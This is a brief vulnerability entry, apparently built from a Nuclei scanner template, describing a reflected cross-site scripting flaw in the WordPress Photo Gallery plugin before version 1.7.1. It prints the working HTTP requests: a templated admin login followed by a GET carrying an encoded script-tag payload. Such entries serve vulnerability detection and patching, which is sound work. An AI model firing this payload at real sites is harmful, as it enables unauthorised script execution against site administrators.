# Vulnerability: Photo Gallery < 1.7.1 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`photo-gallery-xss.yaml`)

## Description
The plugin does not escape some URLs before outputting them back in attributes, leading to Reflected Cross-Site Scripting.

## Secure Mitigation
This is resolved in release 1.7.1.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/plugins.php?%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
```

